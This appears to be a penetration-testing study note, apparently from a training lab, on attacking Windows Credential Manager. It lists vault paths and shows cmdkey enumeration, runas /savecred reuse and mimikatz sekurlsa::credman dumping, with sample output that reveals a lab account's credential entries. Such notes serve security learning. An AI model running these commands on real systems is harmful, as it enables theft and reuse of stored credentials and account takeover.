- build into Windows since Server 2008 R2 and Windows 7
- allows users and applications to securely store creds relevant to other systems
  
# Locations
```Markdown
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```
- each vault folder has a Policy.pol with AES keys that are protected by DPAPI
  
- can export Windows Vaults to .crd files via Control Panel or the the following:
```Markdown
rundll32 keymgr.dll,KRShowKeyMgr
```
![[../../assets/Windows Credential Manager/image 350.png|image 350.png]]
- have to be on the user with the saved creds
  
# Enumerating Credentials with cmdkey
- can use cmdkey to enumerate credentials stored for current user
```Markdown
cmdkey /list
```
```Markdown
C:\Users\sadams>whoami
srv01\sadams
C:\Users\sadams>cmdkey /list
Currently stored credentials:
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence
    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```
- stored credentials are listed with the following format
|**Key**|**Value**|
|---|---|
|Target|The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.|
|Type|The kind of credential. Common types are `Generic` for general credentials, and `Domain Password` for domain user logons.|
|User|The user account associated with the credential.|
|Persistence|Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with `Local machine persistence` survive reboots.|
  
# Runas
- if you come across saved credentials, use runas
```Markdown
runas /savecred /user:<user> cmd
```
![[../../assets/Windows Credential Manager/image 1 260.png|image 1 260.png]]
  
# Extracting Credentials with Mimikatz
```Markdown
mimikatz.exe
privilege::debug
sekurlsa::credman
```
```Markdown
C:\Users\Administrator\Desktop> mimikatz.exe
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::credman
...SNIP...
Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...
...SNIP...
```